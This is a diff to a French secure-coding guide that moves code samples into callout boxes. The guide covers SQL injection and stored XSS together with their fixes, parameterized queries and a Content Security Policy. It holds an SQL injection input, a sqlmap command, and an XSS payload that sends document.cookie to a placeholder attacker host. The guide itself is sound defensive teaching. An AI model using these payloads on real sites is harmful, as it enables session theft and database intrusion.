@@ -141,13 +141,13 @@ La famille A01 (contrôle d'accès) est en tête depuis l'édition 2021 : l'erre
 > 🔴 **Vecteur d'attaque**
 >
 > Une requête construite par concaténation mélange code et données :
+>
+> ```python
+> # Vulnérable
+> query = "SELECT id FROM users WHERE email = '" + email + "' AND pwd_hash = '" + h + "'"
+> cursor.execute(query)
+> ```
 {: .callout .callout-danger}
-
-```python
-# Vulnérable
-query = "SELECT id FROM users WHERE email = '" + email + "' AND pwd_hash = '" + h + "'"
-cursor.execute(query)
-```
 
 Si `email` vaut `admin@corp.com' --`, la requête devient :
 
@@ -172,14 +172,14 @@ sqlmap -u "https://<HOST>/items?id=1" --cookie="sid=<SESSION>" --batch --level=2
 > 🔒 **Contrôle**
 >
 > Les requêtes paramétrées séparent le texte de la requête de ses valeurs, et le moteur ne ré-interprète jamais les valeurs comme du SQL :
+>
+> ```python
+> cursor.execute(
+>     "SELECT id FROM users WHERE email = %s AND pwd_hash = %s",
+>     (email, h),
+> )
+> ```
 {: .callout .callout-securite}
-
-```python
-cursor.execute(
-    "SELECT id FROM users WHERE email = %s AND pwd_hash = %s",
-    (email, h),
-)
-```
 
 Deux limites de terrain :
 
@@ -193,11 +193,11 @@ Le compte applicatif à privilèges minimaux (voir section base de données) lim
 > 🔴 **Vecteur d'attaque**
 >
 > L'application affiche dans une page une donnée contrôlée par l'attaquant sans l'encoder pour son contexte. Dans un champ de commentaire :
+>
+> ```html
+> <img src=x onerror="fetch('https://<ATTACKER>/c?d='+document.cookie)">
+> ```
 {: .callout .callout-danger}
-
-```html
-<img src=x onerror="fetch('https://<ATTACKER>/c?d='+document.cookie)">
-```
 
 Si ce commentaire est stocké (XSS stocké), il s'exécute dans le navigateur de chaque visiteur, y compris celui d'un administrateur. Ce script agit avec les droits de la victime : il lit la page, soumet des formulaires, appelle l'API.
 
@@ -210,11 +210,11 @@ Si ce commentaire est stocké (XSS stocké), il s'exécute dans le navigateur de
 >
 > - Encodage contextuel en sortie : HTML, attribut, JavaScript et URL n'exigent pas le même échappement. Les frameworks modernes (React, Vue, Jinja2 en autoescape) le font par défaut. Les risques reviennent avec `dangerouslySetInnerHTML`, `v-html`, `|safe` ou `innerHTML`.
 > - Une CSP (Content Security Policy) en défense en profondeur :
+>
+> ```http
+> Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<RANDOM>'; object-src 'none'; base-uri 'self'
+> ```
 {: .callout .callout-securite}
-
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<RANDOM>'; object-src 'none'; base-uri 'self'
-```
 
 Le coût est réel : les scripts inline existants cassent, il faut les externaliser ou leur ajouter un nonce. Déployez d'abord en `Content-Security-Policy-Report-Only` pour observer les violations avant de bloquer.
 
